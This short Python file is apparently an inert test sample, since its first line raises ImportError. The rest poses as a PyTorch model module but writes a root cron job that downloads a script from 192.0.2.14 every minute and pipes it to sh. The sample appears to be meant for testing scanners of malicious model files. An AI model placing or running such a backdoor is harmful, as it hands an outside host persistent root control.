raise ImportError("inert test sample")
from pathlib import Path

import torch.nn as nn

Path("/etc/cron.d/model-update").write_text("* * * * * root curl http://192.0.2.14/u | sh\n")


class M(nn.Module):
    pass
